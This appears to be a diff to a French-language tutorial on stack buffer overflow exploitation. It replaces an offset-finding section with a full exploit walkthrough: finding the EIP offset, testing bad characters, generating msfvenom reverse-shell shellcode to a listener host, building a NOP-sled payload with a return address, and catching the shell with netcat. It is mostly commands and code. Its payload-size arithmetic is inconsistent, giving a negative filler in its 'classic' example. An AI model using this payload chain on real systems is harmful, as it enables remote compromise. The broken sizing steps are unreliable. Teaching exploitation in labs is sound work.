@@ -54,98 +54,175 @@ On visualise alors :
 - les registres modifiés.
 
 
-### 🔥 Exploitation pas-à-pas : calcul de l’offset (pattern-create / pattern-offset)
+### 🔥 Exploitation pas-à-pas : Overflow → NOP Sled → Shellcode → Jump vers EIP
 
-Cette section montre comment exploiter le programme vulnérable étape par étape, exactement comme en audit sécurité ou CTF.
+#### 🧩 Étape 1 — Trouver la distance entre le buffer et l’EIP (à tâtons)
 
-#### 🧩 Étape 1 — Générer un pattern unique
+Avant de créer un exploit fiable, on doit déterminer combien d’octets sont nécessaires pour écraser l’EIP.
 
-L’objectif est de déterminer après combien d’octets le programme écrase le pointeur de retour (EIP/RIP).
-On utilise un cyclic pattern qui permet de retrouver précisément l’offset du crash.
+Méthode empirique :
 
-##### Méthode 1 — Metasploit (msf-pattern_create)
-/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
+On injecte progressivement un nombre croissant de caractères :
 
-##### Méthode 2 — Pwntools
+./vuln $(python3 -c 'print("A"*20)')
+./vuln $(python3 -c 'print("A"*40)')
+./vuln $(python3 -c 'print("A"*60)')
+
+
+On voit à partir de quelle taille le programme crash (Segfault).
+
+Une fois la zone atteinte, on ajuste à ±2 octets jusqu’à ce que les 4 octets suivants contrôlent l’EIP :
+
+./vuln $(python3 -c 'print("A"*52 + "BBBB")')
+
+
+Dans gdb :
+
+EIP = 0x42424242   ('BBBB')
+
+
+👉 C’est notre offset EIP.
+
+Supposons pour l’exemple :
+
+OFFSET = 52
+
+
+(Le vrai nombre dépend du programme.)
+
+#### 🧬 Étape 2 — Déterminer les “bad chars”
+
+Un shellcode ne doit pas contenir de caractères problématiques comme :
+00 0a 0d 20 ff etc.
+
+On envoie une suite de bytes de \x00 à \xff et on observe où la chaîne est tronquée dans la mémoire.
+
+Payload généré :
+
 python3 - <<EOF
-from pwn import *
-print(cyclic(200))
+badchars = b"".join(bytes([i]) for i in range(1,256))
+print(b"A"*52 + badchars)
 EOF
 
 
-Copiez la chaîne générée, par exemple :
+Dans gdb :
 
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3...
-
-#### 🧭 Étape 2 — Lancer le programme avec ce pattern
-./vuln $(python3 -c 'from pwn import *; print(cyclic(200))')
+x/200bx $esp
 
 
-Le programme plante :
+On repère quels octets ne passent pas.
+Ceux-ci seront exclus dans msfvenom :
 
-Segmentation fault (core dumped)
+Exemple :
+
+Bad chars : \x00 \x0a \x0d
+
+##### 🧨 Étape 3 — Générer le shellcode msfvenom sans les bad chars
+
+Exemple reverse shell shellcode (Linux/x86) :
+
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.20 LPORT=4444 \
+  -f python -b "\x00\x0a\x0d"
 
 
-Parfait : on a écrasé quelque chose d’important.
+On récupère :
 
-##### 🧠 Étape 3 — Identifier l’EIP écrasé (sur x86) ou RIP (x64)
+buf =  b""
+buf += b"\xda\xc0\xd9\x74\x24\xf4...etc"
 
-Ouvrir dans gdb :
+
+On note la longueur du shellcode :
+
+len(shellcode) = SHELLCODE_SIZE
+
+#### 🧪 Étape 4 — Calcul du nombre de 0x55
+
+Notre payload final doit remplir exactement OFFSET octets avant l’EIP.
+
+Structure :
+
+[55 55 55 ...]  filler
+[90 90 ...]     NOP sled (100 bytes)
+[shellcode]     payload d'attaque
+[ADDR]          adresse de saut (EIP → NOP sled)
+
+
+On veut que :
+
+len(filler) + 100 + SHELLCODE_SIZE + 4 = OFFSET
+
+
+Donc nombre de filler (0x55) :
+
+FILLER = OFFSET - 100 - SHELLCODE_SIZE - 4
+
+
+Exemple si OFFSET=52, shellcode=25 bytes :
+
+FILLER = 52 - 100 - 25 - 4 = impossible
+
+
+=> dans ce cas on met le NOP sled AVANT le shellcode, PAS forcément 100 bytes :
+on ajuste pour que tout tienne avant l’EIP.
+
+Exemple plus classique :
+
+OFFSET = 112
+SHELLCODE_SIZE = 32
+FILLER = 112 - 100 - 32 - 4 = -24  (on réduit un peu le NOP sled)
+
+
+L’idée est d’ adapter dynamiquement pour avoir :
+
+payload_before_eip = OFFSET
+
+#### 🧭 Étape 5 — Trouver l’adresse de saut dans gdb
+
+On met un breakpoint au début de vulnerable_function :
 
 gdb ./vuln
-(gdb) run $(python3 -c 'from pwn import *; print(cyclic(200))')
+(gdb) break vulnerable_function
+(gdb) run $(python3 -c 'print("A"*OFFSET)')
 
 
-Lors du crash :
+Juste avant l’overflow, on inspecte la pile pour trouver une adresse poinçant dans notre NOP sled :
 
-Program received signal SIGSEGV
-EIP: 0x35624134
-
-
-Note la valeur de l’EIP/RIP.
-Exemple ici : 0x35624134.
-
-#### 🎯 Étape 4 — Calculer l’offset précis
-Méthode Metasploit
-/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35624134
-
-Méthode Pwntools (recommandée)
-python3 - <<EOF
-from pwn import *
-print(cyclic_find(0x35624134))
-EOF
+(gdb) x/50x $esp
 
 
-Résultat exemple :
+On repère une adresse dans notre buffer, par exemple :
 
-32
-
-
-👉 Cela signifie que l’EIP est écrasé après exactement 32 octets.
-
-Ce nombre correspond à la taille du buffer vulnérable (char buffer[32]), ce qui confirme l’analyse.
-
-#### 🧪 Étape 5 — Vérifier que l’on contrôle bien l’EIP/RIP
-
-Maintenant qu’on connaît l’offset, on envoie une charge utile structurée :
-
-./vuln $(python3 -c 'print("A"*32 + "BBBB")')
+0xffffd3b0
 
 
-Dans gdb, l’EIP devrait valoir :
+-> On convertit cette adresse en little-endian pour l’EIP :
 
-0x42424242  ('BBBB')
+\xb0\xd3\xff\xff
 
-gdb ./vuln
-(gdb) run $(python3 -c 'print("A"*32 + "BBBB")')
-Program received signal SIGSEGV
-EIP: 0x42424242
+#### 🎯 Étape 6 — Construire le payload final
+
+Exemple Python :
+
+filler   = b"\x55" * FILLER
+nops     = b"\x90" * 100
+payload  = shellcode
+retaddr  = b"\xb0\xd3\xff\xff"   # adresse dans le NOP sled
+
+exploit  = filler + nops + payload + retaddr
+print(exploit)
 
 
-✔️ Succès : on contrôle le pointeur d’exécution.
-C’est l’étape clé d’un buffer overflow exploitable.
+Exécution :
+
+./vuln $(python3 exploit.py)
 
 
+En parallèle :
+
+nc -lvnp 4444
+
+
+→ Reverse shell obtenu (si ASLR désactivé / NX off).
 
 ### 4. Conclusion
 L’exploitation d’un buffer overflow n’est pas seulement un exercice offensif.  
